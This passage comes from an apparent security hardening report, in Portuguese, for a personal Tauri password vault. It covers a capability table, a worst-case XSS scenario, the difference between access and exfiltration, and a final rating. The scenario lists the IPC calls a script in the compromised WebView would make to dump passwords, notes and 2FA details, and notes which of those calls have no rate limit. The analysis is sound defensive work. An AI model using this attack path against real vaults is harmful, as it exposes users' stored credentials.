| Obter respostas de segurança | impossível (nunca existiu esse caminho) | impossível (sem mudança) |
| Gerar/desativar Recovery Key sem a senha mestra | possível (só exigia `is_unlocked`) | **impossível — exige `current_password` reverificado** |
| Alterar/excluir pergunta de segurança sem a senha mestra | possível | **impossível — exige `current_password` reverificado** |
| Acessar propriedade de outra conta via `property_id` | possível (nenhuma checagem de posse) | **impossível — ownership verificado** |
| Escrever arquivo arbitrário | impossível (sem `fs:*` genérico) | impossível (sem mudança) |
| Enviar segredo via `fetch` para origem remota | bloqueado pela CSP (não verificado interativamente nesta fase nem nas anteriores) | mesma situação — CSP inalterada, ainda não verificada interativamente |
| Ler o clipboard de volta via IPC (`plugin:clipboard-manager|read_text`) | possível (permissão concedida) | **impossível — permissão removida** |
| Executar processo | impossível (sem `shell:*`) | impossível (sem mudança) |

## Pergunta mais importante: qual é o pior ataque realisticamente possível?

Cenário: JavaScript arbitrário executando na WebView, cofre desbloqueado.

1. O script chama `list_accounts_with_relations('all')` — recebe metadados de todas as contas
   (nome, username, email, `has_password`, `has_two_factor` via `two_factor_enabled`), sem nenhum
   ciphertext.
2. Para cada conta com `has_password = true`, chama `reveal_account_password(id)` — recebe a senha
   em texto puro. As primeiras ~25 chamadas em 10 segundos funcionam; a partir daí, cada chamada
   extra falha até a janela deslizante liberar espaço.
3. Repete o mesmo padrão para `reveal_sensitive_property` em cada propriedade sensível de cada
   conta (sujeito ao mesmo limitador, compartilhado entre as duas ações).
4. Chama `get_account_notes`/`get_account_two_factor_details` para cada conta — sem limite de taxa,
   então esses dois campos são colhidos rapidamente, sem throttling.
5. Se quiser, exfiltra tudo via `fetch` — bloqueado pela CSP `connect-src` (esperado, não
   verificado interativamente nesta sessão) — ou copia um por um para o clipboard (não lê de volta,
   porque a permissão de leitura foi removida) — ou simplesmente mantém os dados coletados em
   variáveis JS na própria sessão da WebView comprometida (não precisa "exfiltrar" para fora do
   processo se o próprio atacante já controla esse processo — ver distinção abaixo).

**Resultado:** o mesmo dump completo de senhas/propriedades sensíveis/notes/2FA que já era possível
antes desta fase, só que mais lento para os dois tipos de segredo mais sensíveis (password,
propriedade sensível) e sem conseguir mais colher ciphertext em massa, alterar mecanismos de
recuperação sem a senha mestra, ou ler o clipboard de volta.

## Diferenciar acesso e exfiltração

**Acesso:** sim, um XSS com o cofre desbloqueado ainda acessa qualquer segredo que a UI legítima
acessaria — essa fase não promete (nem poderia prometer honestamente) eliminar isso.

**Exfiltração** (levar o segredo *para fora* do processo do app, ex.: para um servidor do
atacante): aqui a CSP já restritiva desde a Fase 2 é o que importa — `connect-src` sem wildcard
remoto deveria bloquear `fetch`/`XHR`/`WebSocket` para qualquer destino que não seja o próprio
IPC/asset local. Essa camada não foi criada nesta fase, mas é a peça que separa "o atacante viu o
segredo" de "o segredo saiu da máquina do usuário" — e é honesto registrar que essa parte
específica não foi reverificada interativamente nesta sessão (nem em nenhuma das três fases
anteriores, pela mesma limitação de ambiente), ficando como item de alta prioridade no checklist
manual.

## Classificação final

> **BEM ENDURECIDO PARA USO PESSOAL.**

Mantida a mesma classificação das Fases 2 e 3, com evidência adicional que a reforça: o maior item
de escopo que a Fase 3 havia deixado pendente — o oráculo de descriptografia genérico — foi
eliminado, com uma reformulação completa da superfície IPC de segredos (commands por ação/ID,
remoção de ciphertext das listagens, ownership de propriedades, rate limiting e reautenticação),
testada por 54 testes automatizados (10 novos especificamente para esta reformulação) e por
compilação/execução real do app nesta sessão. O que impede uma classificação acima de "uso
pessoal" continua sendo o mesmo risco estrutural, agora mais estreito mas não eliminado: XSS com o
cofre desbloqueado ainda tem o poder que a UI legítima tem — revelar o que o usuário poderia
revelar, um segredo por vez. Para o caso de uso declarado (um cofre pessoal, não um produto
multiusuário/enterprise), esse risco residual é razoável, está documentado com o mesmo nível de
honestidade das três fases anteriores, e não escondido — inclusive quanto ao que não pôde ser
testado interativamente nesta sessão por falta de um driver de UI para Tauri.
